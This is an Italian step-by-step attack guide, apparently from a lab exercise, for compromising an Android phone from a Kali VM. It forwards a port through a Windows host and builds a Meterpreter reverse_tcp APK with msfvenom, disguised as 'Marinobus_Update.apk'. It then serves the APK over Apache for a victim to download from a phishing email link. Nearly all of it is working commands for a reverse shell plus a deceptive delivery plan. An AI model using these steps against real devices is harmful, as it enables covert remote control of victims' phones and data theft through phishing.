# FASE 1.1 Verifica degli indirizzi IP
Si consideri che l'obbiettivo di questa fase di attacco risulta essere un cellulare android connesso alla stessa rete di cui è connesso il simulatore kali

Vogliamo creare un "ponte" di rete per permettere al dispositivo android (Wi-Fi) di connettersi alla VM Kali (NAT), ma prima di procedere confermiamo gli indirizzi ip

* **Kali VM** '192.168.230.132' (NAT)
* **Windows Host** '192.168.1.9' (Wi-Fi)
* **Android** '192.168.1.X (Rete Wi-Fi)

# FASE 1.2 Eseguiamo su PC la PowerShell come amministratore ed inotrare il traffico dalla porta 4447 di Windows alla porta 4447 di Kali

Regola di Forwarding da aggiungere
*netsh interface portproxy add v4tov4 listenport=4447 listenaddress=192.168.1.9 connectport=4447 connectaddress=192.168.230.132*

Verifica che la regola sia attiva
*netsh interface portproxy show all*

Creare una regola firewall in ingresso
*New-NetFirewallRule -DisplayName "Metasploit 4447" -Direction Inbound -Protocol TCP -LocalPort 4447 -Action Allow*

# FASE 2 Creazione del payload

Una volta stabilite le regole torniamo su Kali ed apriamo un terminale;
L'obbiettivo è quello di generare un Payload APK malevolo configurato per puntare all'IP di Windows e avviare l'ascolto

Costruiamo il payload con **msfvenom**
*sudo msfvenom -p android/meterpreter/reverse_tcp* \
  *LHOST=192.168.1.9* \ 
  *LPORT=4447* \             # Porta concordata
  *-o /var/www/html/Marinobus_Update.apk*

Impostiamo i permessi corretti per **Apache**
*sudo chmod 644 /var/www/html/Marinobus_Update.apk*
*sudo chown www-www-data /var/www/html/Marinobus_Update.apk*

# FASE 3 Avviare la sessione di Apache e rendere l'APK scaricabile

In questo modo la vittima (Android) potrà scaricare il payload malevolo dal link inviato tramite mail phishing 
*sudo systemctl start apache2*
*sudo systemctl status apache2*

### La sessione di Apache è aperta, fin quando resta aperta, è possibile scaricare ed eseguire il payload dal link "http://192.168.1.9/Marinobus_Update.apk"